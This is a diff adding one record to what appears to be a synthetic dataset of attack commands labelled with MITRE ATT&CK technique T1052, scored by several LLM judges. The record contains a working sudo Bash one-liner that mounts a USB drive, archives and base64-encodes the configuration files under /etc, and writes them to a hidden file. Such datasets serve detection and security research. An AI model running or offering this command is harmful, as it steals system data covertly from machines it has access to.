@@ -1,0 +1,60 @@
+{
+  "technique_id": "T1052",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "sudo bash -c 'PART=$(ls -1 /dev/disk/by-id/usb-*-part1 2>/dev/null | head -n1); mkdir -p /mnt/usb && mount \"$PART\" /mnt/usb && find /etc -type f -name \"*.conf\" -print0 | tar --null -T - -cf - | gzip -9 | base64 > /mnt/usb/.cfg.dat && sync && umount /mnt/usb'",
+  "explanation": "Finds configuration files, archives them, gzip-compresses and base64-encodes the content, and writes it to a USB under a discreet filename, avoiding any network transfer.",
+  "rationale_steps": [
+    "Resolve and mount a USB partition locally.",
+    "Enumerate config files and tar them into a stream.",
+    "Compress with gzip and base64-encode for casual evasion.",
+    "Write to the USB, sync, and safely unmount.",
+    "All operations are local to the system."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-a8d8a262-64183323",
+  "source_prompt_hash": "a8d8a262",
+  "timestamp_utc": "2025-09-30T05:22:34.253309Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The one-liner has balanced quotes, correct command separators and pipelines, and valid options for ls, mount, find, tar, gzip, and base64.",
+        "semantic_score": 4,
+        "semantic_justification": "It mounts a detected USB partition, packages and obfuscates *.conf files, writes them to a hidden file, and unmounts to enable physical exfiltration, though it depends on sudo privileges and the specific /dev/disk/by-id naming existing.",
+        "combined_score": 4.5,
+        "confidence": 0.85,
+        "timestamp": "2025-10-01T08:28:16.079124Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags, and appropriate error redirection.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements T1052 by identifying a USB device, mounting it, collecting sensitive configuration files, compressing and encoding them to avoid detection, storing them with a hidden filename (.cfg.dat), and properly unmounting the device.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T08:28:18.746098Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags for each utility, and correct command substitution.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent by finding, archiving, compressing, encoding, and discreetly writing configuration files to a USB drive, directly aligning with the T1052 technique and its described behaviors.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T08:28:30.564411Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
